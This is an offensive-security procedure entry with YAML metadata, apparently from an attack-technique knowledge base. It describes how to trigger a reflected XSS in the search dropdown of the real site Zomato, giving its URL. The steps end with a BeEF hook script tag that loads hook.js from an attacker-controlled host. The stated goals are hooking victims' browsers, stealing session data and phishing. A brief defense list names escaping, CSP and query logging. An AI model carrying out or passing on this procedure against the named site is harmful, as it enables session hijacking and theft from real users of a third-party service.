---
id: proc-uuid-004
tags:
  - xss-trigger
  - search-exploitation
  - javascript-execution
type: procedure
tools:
  - '[[tools/BeEF]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:30.776Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-Search-for-Malicious-Term

## Summary

This procedure triggers the reflected XSS by searching for the injected dish name on Zomato, causing unescaped payload execution in the browser's search dropdown.

## Description

Targeting Zomato's search functionality (e.g., https://www.zomato.com/kingman-ks/restaurants), this exploits rendering of user input without escaping. Scenario: Victim searches for the term, executing JS. Outcomes: Arbitrary code run, e.g., BeEF hooking. Prerequisites: Injected payload.

## Requirements

1. Injected malicious dish
2. Victim browser (or self for testing)
3. Access to search page

## Defense

Defensive measures and detection strategies:

- Escape HTML/JS in all dynamic UI elements like dropdowns
- Implement Content Security Policy (CSP) to block inline scripts
- Log search queries with special characters for anomaly detection

## Objectives

1. Execute injected JavaScript
2. Hook browser for further exploitation
3. Steal session data or phish

## Instructions

### Step 1: Navigate to Search Page

**Context**: Set up the trigger environment.

Go to https://www.zomato.com/[city]/restaurants (e.g., kingman-ks).

### Step 2: Enter Malicious Search Term

**Context**: Input to activate dropdown.

Type the dish name or special chars (e.g., '>') in the search bar; observe dropdown population.

> Expected output: Payload executes, e.g., alert(1) appears.

### Step 3: Escalate with BeEF

**Context**: Hook the exploited browser.

Replace alert with BeEF hook: <script src="http://beef-url/hook.js"></script>

> Expected output: Browser hooked; control via BeEF dashboard for session hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/BeEF]]

## Tags

- [[reflected-xss]]
- [[browser-hook]]
